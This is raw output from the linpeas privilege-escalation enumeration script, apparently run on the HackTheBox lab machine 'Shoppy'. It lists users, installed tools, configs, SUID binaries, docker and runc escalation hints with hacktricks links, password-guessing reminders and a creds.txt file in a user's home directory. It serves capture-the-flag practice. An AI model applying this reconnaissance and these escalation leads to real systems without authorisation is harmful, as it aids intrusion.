uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(mattermost) gid=997(mattermost) groups=997(mattermost)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 13:03:03 up  8:49,  3 users,  load average: 20.88, 12.21, 5.71                  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
jaeger   pts/2        Tue Nov  8 08:05:53 2022 - Tue Nov  8 08:17:51 2022  (00:11)     10.10.14.100
jaeger   pts/1        Tue Nov  8 06:47:18 2022 - Tue Nov  8 09:02:11 2022  (02:14)     10.10.14.26
jaeger   pts/0        Tue Nov  8 06:06:32 2022 - Tue Nov  8 08:30:43 2022  (02:24)     10.10.14.26
jaeger   pts/0        Tue Nov  8 06:03:24 2022 - Tue Nov  8 06:04:18 2022  (00:00)     10.10.14.26
deploy   pts/1        Tue Nov  8 05:52:33 2022 - Tue Nov  8 05:54:42 2022  (00:02)     10.10.14.241
jaeger   pts/0        Tue Nov  8 05:44:18 2022 - Tue Nov  8 05:54:40 2022  (00:10)     10.10.14.241
jaeger   pts/0        Tue Nov  8 05:12:32 2022 - Tue Nov  8 05:29:42 2022  (00:17)     10.10.16.39
reboot   system boot  Tue Nov  8 04:13:34 2022   still running                         0.0.0.0

wtmp begins Tue Nov  8 04:13:34 2022

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                
jaeger           pts/2    10.10.14.123     Tue Nov  8 12:55:07 -0600 2022
deploy           pts/1    10.10.14.241     Tue Nov  8 05:52:33 -0600 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                        
                                                                                 
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                        
                                                                                 


                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                                            
                                       ╚══════════════════════╝                  
╔══════════╣ Useful software
/usr/bin/base64                                                                  
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/gcc
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/runc
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                                   4:10.2.1-1                       amd64        GNU C compiler
ii  gcc-10                                10.2.1-6                         amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec
                                                                                 
╔══════════╣ Analyzing PostgreSQL Files (limit 70)
Version: psql (PostgreSQL) 13.8 (Debian 13.8-0+deb11u1)                          

-rw-r----- 1 postgres postgres 5007 Jul 22 14:54 /etc/postgresql/13/main/pg_hba.conf                                                                              

-rw-r--r-- 1 postgres postgres 28374 Jul 23 02:57 /etc/postgresql/13/main/postgresql.conf                                                                         
ssl = on
ssl_cert_file = '/etc/ssl/certs/ssl-cert-snakeoil.pem'
ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'
max_wal_size = 1GB
min_wal_size = 80MB
log_timezone = 'US/Central'
stats_temp_directory = '/var/run/postgresql/13-main.pg_stat_tmp'
datestyle = 'iso, mdy'
timezone = 'US/Central'
default_text_search_config = 'pg_catalog.english'
-rw-r--r-- 1 root root 172 Nov 15  2019 /usr/lib/tmpfiles.d/postgresql.conf
d /run/postgresql 2775 postgres postgres - -
d /var/log/postgresql 1775 root postgres - -


═╣ PostgreSQL connection to template0 using postgres/NOPASS ........ No
═╣ PostgreSQL connection to template1 using postgres/NOPASS ........ No          
═╣ PostgreSQL connection to template0 using pgsql/NOPASS ........... No          
═╣ PostgreSQL connection to template1 using pgsql/NOPASS ........... No          
                                                                                 
╔══════════╣ Analyzing Mongo Files (limit 70)
Version: MongoDB shell version v5.0.12                                           
Build Info: {
    "version": "5.0.12",
    "gitVersion": "79cfcdd83eb6f64e164a588d0daf9bb873328b45",
    "openSSLVersion": "OpenSSL 1.1.1n  15 Mar 2022",
    "modules": [],
    "allocator": "tcmalloc",
    "environment": {
        "distmod": "debian10",
        "distarch": "x86_64",
        "target_arch": "x86_64"
    }
}
db version v5.0.12
Build Info: {
    "version": "5.0.12",
    "gitVersion": "79cfcdd83eb6f64e164a588d0daf9bb873328b45",
    "openSSLVersion": "OpenSSL 1.1.1n  15 Mar 2022",
    "modules": [],
    "allocator": "tcmalloc",
    "environment": {
        "distmod": "debian10",
        "distarch": "x86_64",
        "target_arch": "x86_64"
    }
}
./linpeas.sh.1: 2584: [: 0: unexpected operator
-rw-r--r-- 1 root root 615 Dec 18  2013 /etc/mongod.conf
storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: true
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
net:
  port: 27017
  bindIp: 127.0.0.1
processManagement:
  timeZoneInfo: /usr/share/zoneinfo

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found                                                
httpd Not Found                                                                  
                                                                                 
Nginx version: 
./linpeas.sh.1: 2593: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Aug  8 12:48 /etc/nginx/sites-enabled                
drwxr-xr-x 2 root root 4096 Aug  8 12:48 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 48 Jul 22 14:26 /etc/nginx/sites-enabled/mattermost.shoppy.htb -> /etc/nginx/sites-available/mattermost.shoppy.htb                         
server {
  listen 80;
  listen [::]:80;
  server_name mattermost.shoppy.htb;
  location / {
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Host $http_host;
    proxy_set_header X-NginX-Proxy true;
    proxy_set_header Upgrade websocket;
    proxy_set_header Connection Upgrade;
    proxy_pass http://127.0.0.1:8065;
  }
}
lrwxrwxrwx 1 root root 37 Jul 22 12:45 /etc/nginx/sites-enabled/shoppy.htb -> /etc/nginx/sites-available/shoppy.htb                                               
server {
  listen 80;
  listen [::]:80;
  server_name shoppy.htb;
  location / {
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Host $http_host;
    proxy_set_header X-NginX-Proxy true;
    proxy_pass http://localhost:3000;
  }
}




╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1007 Jul 19 09:05 /etc/nginx/fastcgi_params               

╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 Jul 22 11:39 /etc/NetworkManager/system-connections  
drwxr-xr-x 2 root root 4096 Jul 22 11:39 /etc/NetworkManager/system-connections
-rw------- 1 root root 170 Jul 22 11:39 /etc/NetworkManager/system-connections/Wired connection 1                                                                 


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                             
drwxr-xr-x 2 root root 4096 Jul 22 11:37 /etc/ldap


╔══════════╣ Searching ssl/ssh files
ChallengeResponseAuthentication no                                               
UsePAM yes

══╣ Possible private SSH keys were found!
/home/jaeger/.nvm/versions/node/v18.6.0/lib/node_modules/npm/docs/output/using-npm/config.html                                                                    
/home/jaeger/.nvm/versions/node/v18.6.0/lib/node_modules/npm/docs/content/using-npm/config.md                                                                     
/home/jaeger/.nvm/versions/node/v18.6.0/lib/node_modules/npm/lib/utils/config/definitions.js                                                                      
/home/jaeger/ShoppyApp/node_modules/proxy-agent/test/ssl-cert-snakeoil.key
/home/jaeger/ShoppyApp/node_modules/nssocket/test/fixtures/ryans-key.pem

══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                       
/etc/pki/fwupd-metadata/LVFS-CA.pem
/home/jaeger/ShoppyApp/node_modules/nssocket/test/fixtures/ryans-cert.pem
/home/jaeger/ShoppyApp/node_modules/nssocket/test/fixtures/ryans-csr.pem
/home/jaeger/ShoppyApp/node_modules/nssocket/test/fixtures/ryans-key.pem
/home/jaeger/ShoppyApp/node_modules/proxy-agent/test/ssl-cert-snakeoil.pem
/var/lib/fwupd/pki/client.pem
21576PSTORAGE_CERTSBIN

gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent'
gpg-connect-agent: waiting for the agent to come up ... (5s)
gpg-connect-agent: connection to agent established
══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket                    
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/home/deploy/.gnupg/S.gpg-agent.browser
/home/deploy/.gnupg/S.gpg-agent
/home/deploy/.gnupg/S.gpg-agent.ssh
/home/deploy/.gnupg/S.gpg-agent.extra
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                   
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                 


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 12 13:28 /etc/pam.d                              
-rw-r--r-- 1 root root 2133 Jul  1 17:37 /etc/pam.d/sshd




╔══════════╣ Analyzing Keyring Files (limit 70)
drwx------ 2 jaeger jaeger 4096 Aug  9 02:37 /home/jaeger/.local/share/keyrings  
drwxr-xr-x 2 root root 4096 Jul 22 13:24 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                   
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 3 jaeger jaeger 4096 Jul 13 09:17 /home/jaeger/.nvm/versions/node/v18.6.0/lib/node_modules/npm/node_modules/node-gyp/.github
drwxr-xr-x 3 jaeger jaeger 4096 Jul 13 09:17 /home/jaeger/.nvm/versions/node/v18.6.0/lib/node_modules/npm/node_modules/node-gyp/gyp/.github
drwxr-xr-x 3 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/ast-types/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/balanced-match/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/call-bind/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/filelist/node_modules/brace-expansion/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/get-intrinsic/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/has-symbols/.github
drwxr-xr-x 3 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/kareem/.github
drwxr-xr-x 3 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/kruptein/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/object-inspect/.github
drwxr-xr-x 3 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/proxy-agent/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/qs/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/resolve/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/side-channel/.github
drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/supports-preserve-symlinks-flag/.github




╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                     
netpgpkeys Not Found
netpgp Not Found                                                                 
                                                                                 
-rw-r--r-- 1 root root 8700 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 7443 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw------- 1 deploy deploy 1200 Jul 23 03:31 /home/deploy/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 2899 Jul  1 02:03 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 8700 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 55625 Feb 25  2021 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 36873 Feb 25  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 7443 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 2760 Jul 22 13:24 /usr/share/keyrings/docker-archive-keyring.gpg
-rw-r--r-- 1 root root 1162 Jul 22 13:00 /usr/share/keyrings/mongodb.gpg
-rw-r--r-- 1 root root 1067 Jul 22 12:31 /usr/share/keyrings/nginx-archive-keyring.gpg
-rw-r--r-- 1 root root 801 Sep  6 08:25 /var/lib/apt/lists/repo.mongodb.org_apt_debian_dists_buster_mongodb-org_5.0_Release.gpg
-----BEGIN PGP SIGNATURE-----
iQIcBAABCAAGBQJjF0ouAAoJELAKC9HixjwRWBkP/jRxG0DacmILchwUuY/MWFJt
5CfypJ7F4EXacM9dyErqtL+E4PpE3LSfk2YGta9gzrVaktRo78s6QtCzEP1xj8Yb
IG63TPzhjnJGSSg+TEI1PwRTen74W3d4UAFZNnYho4eu4Oq4XOdkBIzhZgUZMrcy
vrScKD599/IuvkJ4/Mw9jLVwfqzX6RKmgeAxYS8LcWnQpc1ZCv5kOLe/6YOTo88f
KwNLCSHkTC9StV2hC0E/ZOnS5Z9t8lZrEi1faLw671L6Mk6DGwiWb/MsDg/wux8X
KYm/TYwHmNkprnYJv+w0UYOX38qlt4waLhxsVePjuomW7IA81EhdYiBBG5JAARY7
b8kQ8QH8Gji32u482JUl5os6UuNnuk8B7uQODYxxyW2nQK6BD/cDD9gIN8gYx5oM
YrN4g6GW9An5gN/NXACjNxOFFkbPahe+NY1Qs1Rkowpus1hSeDw2cKyP9vKk3vuL
oIceUFQAceiZWRwKxgWR0rDbyXvZuQg4fFhR6+BBeJZ/agf6rO9IrGrEatv3XBHc
zzUbFslcYsAHfmAQdUR4hMAayhaUrYrnLD5sSxNEO256fJruOY4OcVe5V7Rw9qWB
29rHYaM0KxgTbtDtilKMQhABNEH/txaevDUbT4rO1jX699KJOyRED1mSAEALTON6
MwNJjcuntJOU/4pX+UWB
=lzF1
-----END PGP SIGNATURE-----

drwx------ 3 deploy deploy 4096 Nov  8 13:03 /home/deploy/.gnupg
drwx------ 3 jaeger jaeger 4096 Jul 23 03:10 /home/jaeger/.gnupg

╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation                                                            
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it    
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation                                                                      
runc was found in /usr/bin/runc, you may be able to escalate privileges with it  

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation                                           
lrwxrwxrwx 1 root root 33 Jul 22 13:25 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
-rw-r--r-- 1 jaeger jaeger 477 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/@pm2/io/docker-compose.yml
-rw-r--r-- 1 root root 175 Sep  8 18:09 /usr/lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 0 Jul 22 13:25 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket


╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r--r-- 1 root root 430792747 Nov  8 13:03 /var/log/nginx/access.log          

-rw-r--r-- 1 root root 111765 Nov  8 13:02 /var/log/nginx/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Mar 27  2022 /etc/skel/.bashrc                       
-rw-r--r-- 1 deploy deploy 3526 Mar 27  2022 /home/deploy/.bashrc
-rw-r--r-- 1 jaeger jaeger 3723 Jul 22 12:05 /home/jaeger/.bashrc



-rw------- 1 jaeger jaeger 91 Nov  8 10:21 /home/jaeger/.lesshst


-rw-r--r-- 1 root root 807 Mar 27  2022 /etc/skel/.profile
-rw-r--r-- 1 deploy deploy 807 Mar 27  2022 /home/deploy/.profile
-rw-r--r-- 1 jaeger jaeger 807 Jul 22 11:39 /home/jaeger/.profile






                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                           
                                         ╚═══════════════════╝                   
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid 
strace Not Found                                                                 
-rwsr-xr-- 1 root dip 395K Jan  6  2021 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                       
-rwsr-xr-x 1 root root 19K Jan 13  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 51K Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                         
-rwsr-xr-x 1 root root 471K Jul  1 17:37 /usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 15K Aug  5 03:00 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)            
-rwsr-xr-x 1 root root 55K Jan 20  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                       
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 71K Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 179K Feb 27  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                             
-rwsr-xr-x 1 root root 155K Jun  8 15:42 /usr/bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)                         
-rwsr-xr-x 1 root root 15K Aug 24 03:28 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 35K Jan 20  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 35K Jun 20  2021 /usr/bin/fusermount3

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid 
-rwxr-sr-x 1 root shadow 38K Aug 26  2021 /usr/sbin/unix_chkpwd                  
-rwxr-sr-x 1 root mail 23K Jan 25  2021 /usr/libexec/camel-lock-helper-1.2
-rwsr-sr-x 1 root root 15K Aug  5 03:00 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root crontab 43K Feb 22  2021 /usr/bin/crontab
-rwxr-sr-x 1 root mail 23K Feb  4  2021 /usr/bin/dotlockfile
-rwxr-sr-x 1 root tty 23K Jan 20  2022 /usr/bin/write.ul (Unknown SGID binary)
-rwxr-sr-x 1 root ssh 347K Jul  1 17:37 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Jan 20  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 79K Feb  7  2020 /usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so         
/etc/ld.so.conf                                                                  
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities  
Current capabilities:                                                            
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep                                                         
/usr/bin/ping cap_net_raw=ep
/usr/bin/gnome-keyring-daemon cap_ipc_lock=ep

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls          
files with acls in searched folders Not Found                                    
                                                                                 
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                        
/usr/bin/dockerd-rootless.sh                                                     
/usr/bin/gettext.sh
/usr/bin/dockerd-rootless-setuptool.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 16                                                                         
drwxr-xr-x  4 root       root       4096 Jul 22 14:16 .
drwxr-xr-x 19 root       root       4096 Sep 12 13:36 ..
drwx--x--x  4 root       root       4096 Jul 22 13:25 containerd
drwxrwxr-x 12 mattermost mattermost 4096 Nov  8 12:22 mattermost

╔══════════╣ Unexpected in root
/initrd.img                                                                      
/vmlinuz
/initrd.img.old
/vmlinuz.old

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 32                                                                         
drwxr-xr-x   2 root root  4096 Jul 22 11:37 .
drwxr-xr-x 126 root root 12288 Nov  8 04:13 ..
-rw-r--r--   1 root root   726 Aug 12  2020 bash_completion.sh
-rw-r--r--   1 root root   349 Dec 17  2020 im-config_wayland.sh
-rw-r--r--   1 root root  1384 Feb 17  2021 vte-2.91.sh
-rw-r--r--   1 root root   966 Feb 17  2021 vte.csh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                   
                                                                                 
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                     
═╣ Credentials in fstab/mtab? ........... No                                     
═╣ Can I read shadow files? ............. No                                     
═╣ Can I read shadow plists? ............ No                                     
═╣ Can I write shadow plists? ........... No                                     
═╣ Can I read opasswd file? ............. No                                     
═╣ Can I write in network-scripts? ...... No                                     
═╣ Can I read root folder? .............. No                                     
                                                                                 
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                           
/home/jaeger/user.txt
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)                                                                              
                                                                                 
╔══════════╣ Readable files belonging to root and readable by me but not world readable                                                                           
                                                                                 
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/journal/4934849c6786423d86d455e2c11cfd36/user-1000.journal              
/var/log/journal/4934849c6786423d86d455e2c11cfd36/system.journal
/var/log/journal/4934849c6786423d86d455e2c11cfd36/user-1001.journal
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/syslog
/var/log/auth.log
/var/log/postgresql/postgresql-13-main.log
/var/log/mongodb/mongod.log
/var/log/btmp
/home/jaeger/.pm2/logs/index-error.log

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                                                         
logrotate 3.18.0                                                                 

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/deploy (limit 20)
total 52                                                                         
drwxr-xr-x 3 deploy deploy  4096 Jul 23 03:34 .
drwxr-xr-x 4 root   root    4096 Jul 22 13:12 ..
lrwxrwxrwx 1 deploy deploy     9 Jul 22 13:14 .bash_history -> /dev/null
-rw-r--r-- 1 deploy deploy   220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 deploy deploy  3526 Mar 27  2022 .bashrc
-rw------- 1 deploy deploy    56 Jul 22 13:15 creds.txt
lrwxrwxrwx 1 deploy deploy     9 Jul 23 03:34 .dbshell -> /dev/null
drwx------ 3 deploy deploy  4096 Nov  8 13:03 .gnupg
-rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 password-manager
-rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp
-rw-r--r-- 1 deploy deploy   807 Mar 27  2022 .profile

╔══════════╣ Files inside others home (limit 20)
/home/jaeger/.lesshst                                                            
/home/jaeger/output.txt
/home/jaeger/shoppy_start.sh
/home/jaeger/.bash_logout
/home/jaeger/.local/share/tracker/data/tracker-store.journal
/home/jaeger/.local/share/tracker/data/tracker-store.ontology.journal
/home/jaeger/.local/share/recently-used.xbel
/home/jaeger/.local/share/folks/relationships.ini
/home/jaeger/.local/share/gnome-settings-daemon/input-sources-converted
/home/jaeger/.local/share/xorg/Xorg.1.log
/home/jaeger/.bashrc
/home/jaeger/.nvm/nvm.sh
/home/jaeger/.nvm/.cache/bin/node-v18.6.0-linux-x64/node-v18.6.0-linux-x64.tar.xz
/home/jaeger/.nvm/bash_completion
/home/jaeger/.nvm/alias/lts/argon
/home/jaeger/.nvm/alias/lts/fermium
/home/jaeger/.nvm/alias/lts/dubnium
/home/jaeger/.nvm/alias/lts/boron
/home/jaeger/.nvm/alias/lts/erbium
/home/jaeger/.nvm/alias/lts/gallium

╔══════════╣ Searching installed mail applications
                                                                                 
╔══════════╣ Mails (limit 50)
                                                                                 
╔══════════╣ Backup folders
                                                                                 
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 475 Sep  7  2020 /usr/share/tracker/tracker-backup.xml    
-rw-r--r-- 1 root root 2681 Dec  7  2020 /usr/share/help/sr@latin/gnome-help/backup-what.page                                                                     
-rw-r--r-- 1 root root 1363 Dec  7  2020 /usr/share/help/sr@latin/gnome-help/backup-restore.page                                                                  
